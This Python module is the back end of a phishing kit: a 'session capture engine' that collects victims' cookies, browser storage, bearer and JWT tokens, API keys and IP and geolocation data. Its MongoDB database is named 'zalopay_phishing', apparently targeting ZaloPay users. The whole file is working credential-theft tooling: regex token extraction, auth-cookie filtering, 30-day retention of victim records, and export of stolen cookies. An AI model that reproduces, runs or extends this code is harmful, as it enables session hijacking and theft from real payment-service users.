"""
Session and Cookie Capture Engine
Intercept and capture browser sessions, cookies, and authentication data
"""

import os
import json
import base64
import secrets
import hashlib
import time
import re
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Set, Tuple
from collections import defaultdict
import logging
import urllib.parse
from urllib.parse import urlparse, parse_qs

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SessionCaptureConfig:
    """Session capture configuration"""

    def __init__(self):
        self.capture_timeout = int(os.getenv("SESSION_CAPTURE_TIMEOUT", "600"))  # 10 minutes
        self.max_session_size = int(os.getenv("MAX_SESSION_SIZE", "10485760"))  # 10MB
        self.enable_cookie_filtering = os.getenv("ENABLE_COOKIE_FILTERING", "true").lower() == "true"
        self.cookie_whitelist = os.getenv("COOKIE_WHITELIST", "sessionid,csrftoken,auth_token,__host-user-session").split(",")
        self.enable_storage_quota_check = os.getenv("ENABLE_STORAGE_QUOTA_CHECK", "true").lower() == "true"
        self.max_cookies_per_domain = int(os.getenv("MAX_COOKIES_PER_DOMAIN", "100"))

class CookieData:
    """Cookie data container"""

    def __init__(self, name: str, value: str, domain: str, path: str = "/",
                 secure: bool = False, http_only: bool = False, same_site: str = None,
                 expires: datetime = None):
        self.name = name
        self.value = value
        self.domain = domain
        self.path = path
        self.secure = secure
        self.http_only = http_only
        self.same_site = same_site
        self.expires = expires
        self.captured_at = datetime.now(timezone.utc)

    def is_expired(self) -> bool:
        """Check if cookie is expired"""
        if not self.expires:
            return False
        return datetime.now(timezone.utc) > self.expires

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "name": self.name,
            "value": self.value,
            "domain": self.domain,
            "path": self.path,
            "secure": self.secure,
            "http_only": self.http_only,
            "same_site": self.same_site,
            "expires": self.expires.isoformat() if self.expires else None,
            "captured_at": self.captured_at.isoformat()
        }

class SessionData:
    """Browser session data container"""

    def __init__(self, session_id: str, victim_id: str = None, domain: str = None):
        self.session_id = session_id
        self.victim_id = victim_id
        self.domain = domain
        self.created_at = datetime.now(timezone.utc)
        self.last_updated = datetime.now(timezone.utc)
        self.expires_at = datetime.now(timezone.utc) + timedelta(seconds=3600)  # 1 hour

        # Session data
        self.cookies: Dict[str, List[CookieData]] = defaultdict(list)  # domain -> cookies
        self.local_storage: Dict[str, Dict[str, str]] = defaultdict(dict)  # domain -> key -> value
        self.session_storage: Dict[str, Dict[str, str]] = defaultdict(dict)  # domain -> key -> value
        self.indexed_db: Dict[str, Any] = {}  # domain -> db data

        # Browser data
        self.user_agent = None
        self.browser_fingerprint = None
        self.ip_address = None
        self.geolocation = None

        # Authentication data
        self.auth_tokens: List[Dict[str, Any]] = []
        self.csrf_tokens: List[Dict[str, Any]] = []
        self.api_keys: List[Dict[str, Any]] = []

        # Status
        self.is_active = True
        self.capture_count = 0

    def add_cookie(self, cookie: CookieData):
        """Add cookie to session"""
        if len(self.cookies[cookie.domain]) < 100:  # Limit cookies per domain
            self.cookies[cookie.domain].append(cookie)
            self.last_updated = datetime.now(timezone.utc)

    def add_local_storage(self, domain: str, key: str, value: str):
        """Add local storage data"""
        self.local_storage[domain][key] = value
        self.last_updated = datetime.now(timezone.utc)

    def add_session_storage(self, domain: str, key: str, value: str):
        """Add session storage data"""
        self.session_storage[domain][key] = value
        self.last_updated = datetime.now(timezone.utc)

    def add_auth_token(self, token_type: str, token_value: str, domain: str = None):
        """Add authentication token"""
        self.auth_tokens.append({
            "type": token_type,
            "value": token_value,
            "domain": domain,
            "captured_at": datetime.now(timezone.utc).isoformat()
        })
        self.last_updated = datetime.now(timezone.utc)

    def is_expired(self) -> bool:
        """Check if session is expired"""
        return datetime.now(timezone.utc) > self.expires_at

    def get_size(self) -> int:
        """Get session data size in bytes"""
        try:
            data = json.dumps(self.to_dict())
            return len(data.encode('utf-8'))
        except Exception:
            return 0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "session_id": self.session_id,
            "victim_id": self.victim_id,
            "domain": self.domain,
            "created_at": self.created_at.isoformat(),
            "last_updated": self.last_updated.isoformat(),
            "expires_at": self.expires_at.isoformat(),
            "cookies": {domain: [cookie.to_dict() for cookie in cookies]
                       for domain, cookies in self.cookies.items()},
            "local_storage": dict(self.local_storage),
            "session_storage": dict(self.session_storage),
            "indexed_db": self.indexed_db,
            "user_agent": self.user_agent,
            "browser_fingerprint": self.browser_fingerprint,
            "ip_address": self.ip_address,
            "geolocation": self.geolocation,
            "auth_tokens": self.auth_tokens,
            "csrf_tokens": self.csrf_tokens,
            "api_keys": self.api_keys,
            "is_active": self.is_active,
            "capture_count": self.capture_count
        }

class SessionCaptureEngine:
    """Main session capture engine"""

    def __init__(self, mongodb_connection=None, redis_client=None, encryption_manager=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.encryption = encryption_manager

        self.config = SessionCaptureConfig()
        self.sessions: Dict[str, SessionData] = {}
        self.domain_sessions: Dict[str, Set[str]] = defaultdict(set)  # domain -> session_ids

        # Start cleanup thread
        self._start_cleanup_thread()

    def _start_cleanup_thread(self):
        """Start background cleanup thread"""
        import threading
        cleanup_thread = threading.Thread(target=self._cleanup_loop, daemon=True)
        cleanup_thread.start()

    def _cleanup_loop(self):
        """Background cleanup loop"""
        while True:
            try:
                time.sleep(300)  # Clean up every 5 minutes
                self._cleanup_expired_sessions()
            except Exception as e:
                logger.error(f"Error in cleanup loop: {e}")

    def _cleanup_expired_sessions(self):
        """Clean up expired sessions"""
        expired_sessions = []

        for session_id, session in self.sessions.items():
            if session.is_expired():
                expired_sessions.append(session_id)

        for session_id in expired_sessions:
            self.destroy_session(session_id)

        if expired_sessions:
            logger.info(f"Cleaned up {len(expired_sessions)} expired sessions")

    def create_session(self, victim_id: str = None, domain: str = None,
                      user_agent: str = None, ip_address: str = None) -> str:
        """
        Create new session capture session

        Args:
            victim_id: Victim identifier
            domain: Target domain
            user_agent: Browser user agent
            ip_address: Client IP address

        Returns:
            Session ID
        """
        try:
            session_id = secrets.token_hex(32)

            session = SessionData(
                session_id=session_id,
                victim_id=victim_id,
                domain=domain
            )

            session.user_agent = user_agent
            session.ip_address = ip_address
            session.browser_fingerprint = self._generate_browser_fingerprint(user_agent, ip_address)

            self.sessions[session_id] = session

            if domain:
                self.domain_sessions[domain].add(session_id)

            # Store in Redis for quick access
            if self.redis:
                self._store_session_in_redis(session)

            logger.info(f"Session capture created: {session_id}")
            return session_id

        except Exception as e:
            logger.error(f"Error creating session: {e}")
            raise

    def capture_cookies(self, session_id: str, cookies_data: List[Dict[str, Any]],
                       domain: str = None) -> Dict[str, Any]:
        """
        Capture cookies for session

        Args:
            session_id: Session ID
            cookies_data: List of cookie dictionaries
            domain: Domain for cookies

        Returns:
            Capture result
        """
        try:
            if session_id not in self.sessions:
                return {"success": False, "error": "Invalid session ID"}

            session = self.sessions[session_id]

            if not session.is_active:
                return {"success": False, "error": "Session is not active"}

            captured_count = 0
            filtered_count = 0

            for cookie_data in cookies_data:
                try:
                    # Create cookie object
                    cookie = CookieData(
                        name=cookie_data.get("name", ""),
                        value=cookie_data.get("value", ""),
                        domain=cookie_data.get("domain", domain or ""),
                        path=cookie_data.get("path", "/"),
                        secure=cookie_data.get("secure", False),
                        http_only=cookie_data.get("http_only", False),
                        same_site=cookie_data.get("same_site"),
                        expires=self._parse_cookie_expiry(cookie_data.get("expires"))
                    )

                    # Filter cookies if enabled
                    if self.config.enable_cookie_filtering:
                        if not self._should_capture_cookie(cookie):
                            filtered_count += 1
                            continue

                    # Check domain cookie limit
                    if len(session.cookies[cookie.domain]) >= self.config.max_cookies_per_domain:
                        logger.warning(f"Cookie limit reached for domain: {cookie.domain}")
                        continue

                    session.add_cookie(cookie)
                    captured_count += 1

                except Exception as e:
                    logger.error(f"Error processing cookie: {e}")
                    continue

            session.capture_count += 1

            # Update in Redis
            if self.redis:
                self._store_session_in_redis(session)

            logger.info(f"Cookies captured: {captured_count} for session {session_id}")
            return {
                "success": True,
                "captured_count": captured_count,
                "filtered_count": filtered_count,
                "total_cookies": sum(len(cookies) for cookies in session.cookies.values())
            }

        except Exception as e:
            logger.error(f"Error capturing cookies: {e}")
            return {"success": False, "error": "Failed to capture cookies"}

    def capture_storage_data(self, session_id: str, storage_type: str,
                           domain: str, data: Dict[str, str]) -> Dict[str, Any]:
        """
        Capture browser storage data (localStorage/sessionStorage)

        Args:
            session_id: Session ID
            storage_type: 'localStorage' or 'sessionStorage'
            domain: Domain
            data: Storage data dictionary

        Returns:
            Capture result
        """
        try:
            if session_id not in self.sessions:
                return {"success": False, "error": "Invalid session ID"}

            session = self.sessions[session_id]

            if not session.is_active:
                return {"success": False, "error": "Session is not active"}

            captured_count = 0

            if storage_type == "localStorage":
                for key, value in data.items():
                    session.add_local_storage(domain, key, value)
                    captured_count += 1

            elif storage_type == "sessionStorage":
                for key, value in data.items():
                    session.add_session_storage(domain, key, value)
                    captured_count += 1

            else:
                return {"success": False, "error": "Invalid storage type"}

            session.capture_count += 1

            # Update in Redis
            if self.redis:
                self._store_session_in_redis(session)

            logger.info(f"Storage data captured: {captured_count} items for session {session_id}")
            return {
                "success": True,
                "captured_count": captured_count,
                "storage_type": storage_type,
                "domain": domain
            }

        except Exception as e:
            logger.error(f"Error capturing storage data: {e}")
            return {"success": False, "error": "Failed to capture storage data"}

    def capture_auth_data(self, session_id: str, auth_type: str, token_value: str,
                         domain: str = None, additional_data: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Capture authentication data (tokens, API keys, etc.)

        Args:
            session_id: Session ID
            auth_type: Type of auth data (bearer_token, api_key, csrf_token, etc.)
            token_value: Token or key value
            domain: Domain where token was found
            additional_data: Additional metadata

        Returns:
            Capture result
        """
        try:
            if session_id not in self.sessions:
                return {"success": False, "error": "Invalid session ID"}

            session = self.sessions[session_id]

            if not session.is_active:
                return {"success": False, "error": "Session is not active"}

            # Add auth token
            session.add_auth_token(auth_type, token_value, domain)

            # Store additional data if provided
            if additional_data:
                auth_entry = session.auth_tokens[-1]
                auth_entry.update(additional_data)

            session.capture_count += 1

            # Update in Redis
            if self.redis:
                self._store_session_in_redis(session)

            logger.info(f"Auth data captured: {auth_type} for session {session_id}")
            return {
                "success": True,
                "auth_type": auth_type,
                "domain": domain,
                "total_auth_tokens": len(session.auth_tokens)
            }

        except Exception as e:
            logger.error(f"Error capturing auth data: {e}")
            return {"success": False, "error": "Failed to capture auth data"}

    def extract_tokens_from_text(self, session_id: str, text: str, domain: str = None) -> Dict[str, Any]:
        """
        Extract authentication tokens from text/HTML content

        Args:
            session_id: Session ID
            text: Text content to analyze
            domain: Domain context

        Returns:
            Extraction result
        """
        try:
            if session_id not in self.sessions:
                return {"success": False, "error": "Invalid session ID"}

            session = self.sessions[session_id]

            if not session.is_active:
                return {"success": False, "error": "Session is not active"}

            extracted_count = 0
            patterns = {
                "bearer_token": r"Bearer\s+([A-Za-z0-9\-_]+(?:\.[A-Za-z0-9\-_]+){2})",
                "jwt_token": r"eyJ[A-Za-z0-9\-_]+(?:\.[A-Za-z0-9\-_]+){2}",
                "api_key": r"(?i)(api_key|apikey|api-key)[\"']?\s*[:=]\s*[\"']?([A-Za-z0-9\-_]{32,})",
                "csrf_token": r"(?i)(csrf[_-]?token|xsrf[_-]?token)[\"']?\s*[:=]\s*[\"']?([A-Za-z0-9\-_]{32,})",
                "session_id": r"(?i)(session[_-]?id|sessionid|jsessionid)[\"']?\s*[:=]\s*[\"']?([A-Za-z0-9\-_]{16,})",
                "auth_token": r"(?i)(auth[_-]?token|authorization)[\"']?\s*[:=]\s*[\"']?([A-Za-z0-9\-_]{16,})"
            }

            for token_type, pattern in patterns.items():
                matches = re.findall(pattern, text, re.IGNORECASE | re.MULTILINE)

                for match in matches:
                    token_value = match if isinstance(match, str) else match[1] if len(match) > 1 else match[0]

                    # Avoid duplicates
                    existing_tokens = [token.get("value") for token in session.auth_tokens
                                     if token.get("type") == token_type]
                    if token_value not in existing_tokens:
                        session.add_auth_token(token_type, token_value, domain)
                        extracted_count += 1

            if extracted_count > 0:
                session.capture_count += 1

                # Update in Redis
                if self.redis:
                    self._store_session_in_redis(session)

            logger.info(f"Tokens extracted: {extracted_count} for session {session_id}")
            return {
                "success": True,
                "extracted_count": extracted_count,
                "patterns_used": list(patterns.keys())
            }

        except Exception as e:
            logger.error(f"Error extracting tokens: {e}")
            return {"success": False, "error": "Failed to extract tokens"}

    def process_victim_capture(self, victim_data: Dict[str, Any]) -> str:
        """
        Process victim data capture

        Args:
            victim_data: Victim information dictionary

        Returns:
            Victim ID
        """
        try:
            # Generate victim ID
            victim_id = secrets.token_hex(16)

            # Add metadata
            victim_data["victim_id"] = victim_id
            victim_data["processed_at"] = datetime.now(timezone.utc)

            # Store in MongoDB
            if self.mongodb:
                db = self.mongodb.get_database("zalopay_phishing")
                victims_collection = db.victim_captures

                victims_collection.insert_one(victim_data)

            # Store in Redis for quick access
            if self.redis:
                key = f"victim:{victim_id}"
                self.redis.setex(key, 2592000, json.dumps(victim_data))  # 30 days

            logger.info(f"Victim data processed: {victim_id}")
            return victim_id

        except Exception as e:
            logger.error(f"Error processing victim capture: {e}")
            return None

    def process_session_capture(self, session_data: Dict[str, Any]) -> str:
        """
        Process session data capture

        Args:
            session_data: Session information dictionary

        Returns:
            Session record ID
        """
        try:
            # Generate session record ID
            session_record_id = secrets.token_hex(16)

            # Add metadata
            session_data["session_record_id"] = session_record_id
            session_data["processed_at"] = datetime.now(timezone.utc)

            # Store in MongoDB
            if self.mongodb:
                db = self.mongodb.get_database("zalopay_phishing")
                sessions_collection = db.session_captures

                sessions_collection.insert_one(session_data)

            # Store in Redis for quick access
            if self.redis:
                key = f"session_record:{session_record_id}"
                self.redis.setex(key, 2592000, json.dumps(session_data))  # 30 days

            logger.info(f"Session data processed: {session_record_id}")
            return session_record_id

        except Exception as e:
            logger.error(f"Error processing session capture: {e}")
            return None

    def get_capture_stats(self) -> Dict[str, Any]:
        """
        Get capture statistics

        Returns:
            Dictionary with capture statistics
        """
        try:
            # Get victim count from MongoDB
            victim_count = 0
            if self.mongodb:
                db = self.mongodb.get_database("zalopay_phishing")
                victim_count = db.victim_captures.count_documents({})

            # Get session count from MongoDB
            session_count = 0
            if self.mongodb:
                session_count = db.session_captures.count_documents({})

            # Get active sessions in memory
            active_sessions = len([s for s in self.sessions.values() if s.is_active])

            return {
                "total_victims": victim_count,
                "total_sessions": session_count,
                "active_sessions": active_sessions,
                "memory_sessions": len(self.sessions)
            }

        except Exception as e:
            logger.error(f"Error getting capture stats: {e}")
            return {
                "total_victims": 0,
                "total_sessions": 0,
                "active_sessions": 0,
                "memory_sessions": 0
            }

    def get_session_stats(self) -> Dict[str, Any]:
        """
        Get session statistics

        Returns:
            Dictionary with session statistics
        """
        try:
            # Get session data from MongoDB
            session_count = 0
            unique_ips = set()
            domains = set()

            if self.mongodb:
                db = self.mongodb.get_database("zalopay_phishing")
                sessions_collection = db.session_captures

                # Get recent sessions (last 24 hours)
                cutoff_time = datetime.now(timezone.utc) - timedelta(hours=24)
                recent_sessions = list(sessions_collection.find({
                    "processed_at": {"$gte": cutoff_time.isoformat()}
                }))

                session_count = len(recent_sessions)

                for session in recent_sessions:
                    if "client_ip" in session:
                        unique_ips.add(session["client_ip"])
                    if "page_url" in session:
                        try:
                            domain = urlparse(session["page_url"]).netloc
                            if domain:
                                domains.add(domain)
                        except:
                            pass

            return {
                "recent_sessions": session_count,
                "unique_ips": len(unique_ips),
                "unique_domains": len(domains),
                "active_memory_sessions": len([s for s in self.sessions.values() if s.is_active])
            }

        except Exception as e:
            logger.error(f"Error getting session stats: {e}")
            return {
                "recent_sessions": 0,
                "unique_ips": 0,
                "unique_domains": 0,
                "active_memory_sessions": 0
            }

    def health_check(self) -> bool:
        """
        Health check for session capture engine

        Returns:
            True if healthy, False otherwise
        """
        try:
            # Check MongoDB connection
            if self.mongodb:
                try:
                    db = self.mongodb.get_database("zalopay_phishing")
                    db.command("ping")
                except Exception as e:
                    logger.error(f"MongoDB health check failed: {e}")
                    return False

            # Check Redis connection
            if self.redis:
                try:
                    self.redis.ping()
                except Exception as e:
                    logger.error(f"Redis health check failed: {e}")
                    return False

            # Check if sessions are accessible
            if hasattr(self, 'sessions'):
                return True

            return True

        except Exception as e:
            logger.error(f"Session capture health check failed: {e}")
            return False

    def _should_capture_cookie(self, cookie: CookieData) -> bool:
        """Check if cookie should be captured based on whitelist"""
        # Always capture whitelisted cookies
        if cookie.name.lower() in [name.lower().strip() for name in self.config.cookie_whitelist]:
            return True

        # Capture authentication-related cookies
        auth_patterns = [
            "auth", "session", "token", "csrf", "xsrf", "jwt", "bearer",
            "login", "user", "account", "secure", "remember"
        ]

        cookie_name_lower = cookie.name.lower()
        return any(pattern in cookie_name_lower for pattern in auth_patterns)

    def _parse_cookie_expiry(self, expires_str: str) -> Optional[datetime]:
        """Parse cookie expiry string"""
        if not expires_str:
            return None

        try:
            # Handle Unix timestamp
            if expires_str.isdigit():
                return datetime.fromtimestamp(int(expires_str), timezone.utc)

            # Handle date formats
            from email.utils import parsedate_to_datetime
            return parsedate_to_datetime(expires_str)

        except Exception:
            return None

    def _generate_browser_fingerprint(self, user_agent: str = None, ip_address: str = None) -> str:
        """Generate browser fingerprint"""
        try:
            data = f"{user_agent or ''}:{ip_address or ''}:{secrets.token_hex(8)}"
            return hashlib.sha256(data.encode()).hexdigest()
        except Exception as e:
            logger.error(f"Error generating fingerprint: {e}")
            return secrets.token_hex(16)

    def get_session(self, session_id: str) -> Optional[SessionData]:
        """Get session by ID"""
        return self.sessions.get(session_id)

    def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get session information"""
        session = self.sessions.get(session_id)
        return session.to_dict() if session else None

    def get_domain_sessions(self, domain: str) -> List[SessionData]:
        """Get all sessions for a domain"""
        session_ids = self.domain_sessions.get(domain, set())
        return [self.sessions[sid] for sid in session_ids if sid in self.sessions]

    def destroy_session(self, session_id: str) -> bool:
        """Destroy session"""
        try:
            if session_id not in self.sessions:
                return False

            session = self.sessions[session_id]

            # Remove from domain index
            if session.domain:
                self.domain_sessions[session.domain].discard(session_id)

            # Remove session
            del self.sessions[session_id]

            # Remove from Redis
            if self.redis:
                self._delete_session_from_redis(session_id)

            # Remove from MongoDB
            if self.mongodb:
                self._delete_session_from_mongodb(session_id)

            logger.info(f"Session destroyed: {session_id}")
            return True

        except Exception as e:
            logger.error(f"Error destroying session: {e}")
            return False

    def export_session_data(self, session_id: str, format: str = "json") -> Optional[str]:
        """
        Export session data

        Args:
            session_id: Session ID
            format: Export format (json, csv)

        Returns:
            Exported data as string
        """
        try:
            session = self.sessions.get(session_id)
            if not session:
                return None

            if format.lower() == "json":
                return json.dumps(session.to_dict(), indent=2)

            elif format.lower() == "csv":
                # Export cookies as CSV
                csv_lines = ["Domain,Name,Value,Path,Secure,HttpOnly,SameSite,Expires,CapturedAt"]

                for domain, cookies in session.cookies.items():
                    for cookie in cookies:
                        csv_lines.append(
                            f'"{domain}","{cookie.name}","{cookie.value}","{cookie.path}",'
                            f'"{cookie.secure}","{cookie.http_only}","{cookie.same_site or ""}",'
                            f'"{cookie.expires}","{cookie.captured_at}"'
                        )

                return "\n".join(csv_lines)

            else:
                raise ValueError(f"Unsupported export format: {format}")

        except Exception as e:
            logger.error(f"Error exporting session data: {e}")
            return None

    def _store_session_in_redis(self, session: SessionData):
        """Store session in Redis"""
        try:
            if not self.redis:
                return

            key = f"session_capture:{session.session_id}"
            data = json.dumps(session.to_dict())

            # Set expiration
            ttl = int((session.expires_at - datetime.now(timezone.utc)).total_seconds())
            if ttl > 0:
                self.redis.setex(key, ttl, data)

        except Exception as e:
            logger.error(f"Error storing session in Redis: {e}")

    def _delete_session_from_redis(self, session_id: str):
        """Delete session from Redis"""
        try:
            if not self.redis:
                return

            key = f"session_capture:{session_id}"
            self.redis.delete(key)

        except Exception as e:
            logger.error(f"Error deleting session from Redis: {e}")

    def _delete_session_from_mongodb(self, session_id: str):
        """Delete session from MongoDB"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            sessions_collection = db.session_captures

            sessions_collection.delete_one({"session_id": session_id})

        except Exception as e:
            logger.error(f"Error deleting session from MongoDB: {e}")

# Global session capture engine instance
session_capture_engine = None

def initialize_session_capture(mongodb_connection=None, redis_client=None, encryption_manager=None) -> SessionCaptureEngine:
    """Initialize global session capture engine"""
    global session_capture_engine
    session_capture_engine = SessionCaptureEngine(mongodb_connection, redis_client, encryption_manager)
    return session_capture_engine

def get_session_capture_engine() -> SessionCaptureEngine:
    """Get global session capture engine"""
    if session_capture_engine is None:
        raise ValueError("Session capture engine not initialized")
    return session_capture_engine

# Convenience functions
def create_session(victim_id: str = None, domain: str = None, user_agent: str = None, ip_address: str = None) -> str:
    """Create session (global convenience function)"""
    return get_session_capture_engine().create_session(victim_id, domain, user_agent, ip_address)

def capture_cookies(session_id: str, cookies_data: List[Dict[str, Any]], domain: str = None) -> Dict[str, Any]:
    """Capture cookies (global convenience function)"""
    return get_session_capture_engine().capture_cookies(session_id, cookies_data, domain)

def capture_storage_data(session_id: str, storage_type: str, domain: str, data: Dict[str, str]) -> Dict[str, Any]:
    """Capture storage data (global convenience function)"""
    return get_session_capture_engine().capture_storage_data(session_id, storage_type, domain, data)

def extract_tokens_from_text(session_id: str, text: str, domain: str = None) -> Dict[str, Any]:
    """Extract tokens from text (global convenience function)"""
    return get_session_capture_engine().extract_tokens_from_text(session_id, text, domain)